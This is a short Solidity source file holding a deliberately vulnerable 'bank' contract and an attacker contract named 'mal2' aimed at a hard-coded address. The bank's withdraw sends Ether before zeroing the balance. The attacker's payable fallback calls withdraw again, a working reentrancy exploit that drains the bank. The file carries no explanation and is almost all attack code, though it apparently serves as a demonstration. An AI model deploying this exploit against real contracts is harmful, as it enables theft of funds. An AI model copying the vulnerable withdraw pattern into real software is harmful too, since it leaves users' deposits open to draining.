pragma solidity ^0.4.0;

contract bank{
    mapping(address=>uint)account;
    function deposit()payable{
        account[msg.sender]+=msg.value;    
    }
    function withdraw(){
        if(msg.sender.call.value(account[msg.sender])())
            account[msg.sender]=0;
    }
    function getaccount(address addr)constant returns(uint){
        return account[addr];
    }
}
//0x613FaA872b4C1dBd1e88df62F8356Fb9716Eb867
contract mal2{
    address addr=0x613FaA872b4C1dBd1e88df62F8356Fb9716Eb867;
    function()payable{
        bank(addr).withdraw();
    }
    function deposit(address dest,uint x)returns(bool){
        x=x*(10**18);        
        return addr.call.value(x)(bytes4(sha3("deposit()")));
    }
    function withdraw(){
        bank(addr).withdraw();
    }
}
